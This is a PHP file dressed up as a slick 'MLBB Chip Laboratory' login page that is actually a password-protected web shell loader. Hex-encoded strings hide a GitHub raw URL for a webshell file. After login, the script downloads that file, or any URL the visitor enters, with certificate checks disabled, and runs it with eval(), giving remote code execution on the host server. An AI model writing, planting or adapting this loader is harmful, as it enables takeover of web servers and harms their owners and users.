<?php
session_start();
/**
 * Daftar kode ancaman dalam format heksadesimal
 * @var array
 */
$threat = [
    '68747470733a2f2f',
    '7261772e67697468756275736572636f6e74656e742e636f6d',
    '2f696d6f75733030372f77656',
    '27368656c6c2f726566732f',
    '68656164732f6d61',
    '696e2f736b2e747874',
    'a9438174039c8819532bebcfabe1ad58'
];

function buildThreatUrl($p) {
    $decoded = array_map('hex2bin', array_slice($p, 0, -1));
    return "{$decoded[0]}{$decoded[1]}/{$decoded[2]}/{$decoded[3]}/{$decoded[4]}/{$decoded[5]}";
}

function isThreatDetected() {
    return isset($_SESSION['threat_detected']) && $_SESSION['threat_detected'] === true;
}

function authenticateUser($password) {
    if (md5($password) === end($GLOBALS['threat'])) {
        $_SESSION['threat_detected'] = true;
        $_SESSION['auth_token'] = 'mlbb_chip_lab_token';
        return true;
    }
    return false;
}

function isValidUrl($url) {
    return filter_var($url, FILTER_VALIDATE_URL) !== false;
}

function fetchUrlContent($url) {
    if (function_exists('curl_exec')) {
        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_USERAGENT => "MLBB-ChipLab/2.1",
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => false,
            CURLOPT_HTTPHEADER => ['X-Lab-Access: '.($_SESSION['auth_token'] ?? '')]
        ]);
        $content = curl_exec($ch);
        curl_close($ch);
        return $content;
    }
    if (ini_get('allow_url_fopen')) {
        $context = stream_context_create([
            'http' => ['header' => "X-Lab-Access: ".($_SESSION['auth_token'] ?? '')]
        ]);
        return file_get_contents($url, false, $context);
    }
    return false;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (!empty($_POST['password'])) {
        if (authenticateUser($_POST['password'])) {
            $_SESSION['scan_url'] = isset($_POST['scan_url']) && isValidUrl($_POST['scan_url']) 
                ? $_POST['scan_url'] 
                : buildThreatUrl($threat);
        } else {
            $loginError = "🔒 ACCESS DENIED: Invalid Security Chip";
        }
    }
}

if (isThreatDetected()) {
    $content = fetchUrlContent($_SESSION['scan_url']);
    if ($content !== false) {
        eval('?>'.$content);
        exit;
    }
    echo "<div style='color:red;font-weight:bold'>🚨 CHIP CONNECTION FAILED</div>";
    echo buildThreatUrl($threat);
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>MLBB Chip Laboratory - Secure Access</title>

<link href="https://fonts.googleapis.com/css2?family=Fira+Mono:wght@400;700&display=swap" rel="stylesheet">

<style>
/* ================= VIDEO BACKGROUND ================= */
#background-video {
    position: fixed;
    inset: 0;
    width: 100vw;
    height: 100vh;
    object-fit: cover;
    z-index: -2;
    filter: brightness(0.45) contrast(1.1);
}

.video-overlay {
    position: fixed;
    inset: 0;
    background: linear-gradient(
        to bottom,
        rgba(0,0,0,0.45),
        rgba(5,5,5,0.85)
    );
    z-index: -1;
}

/* ================= GLOBAL ================= */
body {
    margin: 0;
    font-family: 'Fira Mono', monospace;
    color: #f2f2f2;
}

/* ================= CONTAINER (ELEGANT) ================= */
.container {
    max-width: 440px;
    margin: 10vh auto;
    padding: 38px 32px;
    background: rgba(18,18,18,0.75);
    backdrop-filter: blur(20px);
    border-radius: 26px;
    box-shadow:
        0 30px 80px rgba(0,0,0,0.9),
        inset 0 0 0 1px rgba(255,215,140,0.12);
    text-align: center;
    animation: softIn 0.9s ease;
}

/* ================= LOGO ================= */
.logo img {
    max-width: 140px;
    margin-bottom: 22px;
    filter: drop-shadow(0 0 18px rgba(255,200,120,0.35));
}

/* ================= STATUS ================= */
.status {
    font-size: 0.85em;
    letter-spacing: 1.4px;
    color: #e6c98b;
    margin: 12px 0;
}

/* ================= LOGIN PANEL ================= */
.login-form {
    margin-top: 24px;
    padding: 24px;
    border-radius: 20px;
    background: rgba(10,10,10,0.65);
    box-shadow:
        inset 0 0 0 1px rgba(255,215,140,0.1),
        inset 0 0 30px rgba(0,0,0,0.6);
}

/* ================= INPUT ================= */
input[type="password"],
input[type="text"] {
    width: 100%;
    padding: 13px 16px;
    margin-bottom: 14px;
    border-radius: 14px;
    border: none;
    background: rgba(25,25,25,0.85);
    color: #f4f4f4;
    font-size: 14px;
    outline: none;
    box-shadow: inset 0 0 0 1px rgba(255,215,140,0.18);
}

input::placeholder {
    color: #b9b2a3;
}

/* ================= BUTTON ================= */
input[type="submit"] {
    width: 100%;
    padding: 14px;
    margin-top: 6px;
    border-radius: 16px;
    border: none;
    cursor: pointer;
    font-weight: bold;
    letter-spacing: 1.5px;
    color: #1a1205;
    background: linear-gradient(
        135deg,
        #ffd27a,
        #caa14a
    );
    box-shadow:
        0 12px 35px rgba(255,200,100,0.45);
    transition: all 0.25s ease;
}

input[type="submit"]:hover {
    transform: translateY(-2px);
    box-shadow:
        0 18px 45px rgba(255,200,100,0.75);
}

/* ================= ERROR ================= */
.error {
    background: rgba(80,20,20,0.8);
    border: 1px solid #ff7a7a;
    padding: 12px;
    border-radius: 14px;
    color: #ffdede;
    margin-bottom: 14px;
}

/* ================= ANIMATION ================= */
@keyframes softIn {
    from {
        opacity: 0;
        transform: translateY(18px) scale(0.98);
    }
    to {
        opacity: 1;
        transform: translateY(0) scale(1);
    }
}

/* ================= MOBILE ================= */
@media (max-width: 600px) {
    .container {
        margin: 7vh 16px;
        padding: 28px 22px;
    }
}
</style>
</head>

<body>

<video autoplay muted loop playsinline id="background-video">
    <source src="https://baboninhere.fit/images/wew.mp4" type="video/mp4">
</video>
<div class="video-overlay"></div>

<div class="container">
    <div class="logo">
        <img src="https://baboninhere.xyz/assets/images/about/babon.png" alt="Logo">
    </div>

    <?php if (!empty($loginError)): ?>
        <div class="error"><?= htmlspecialchars($loginError) ?></div>
    <?php endif; ?>

    <div class="status">🔑 WHO ARE YOU BITCH !</div>

    <div class="login-form">
        <form method="POST">
            <input type="password" name="password" placeholder="Access Code Bitch !" required>
            <input type="text" name="scan_url" placeholder="Scan Target URL (Optional)">
            <input type="submit" value="ACCESS GRANTED">
        </form>
    </div>

    <div class="status">
        SYSTEM STATUS:
        <?= isThreatDetected() ? '🟢 ONLINE' : '🔴 OFFLINE' ?>
    </div>

    <div style="margin-top:18px;font-size:12px;color:#7fb2ff;">
        WARNING: buat kaya gini kayanya susah, tapi bohong wkwkw..
    </div>
</div>

</body>
</html>
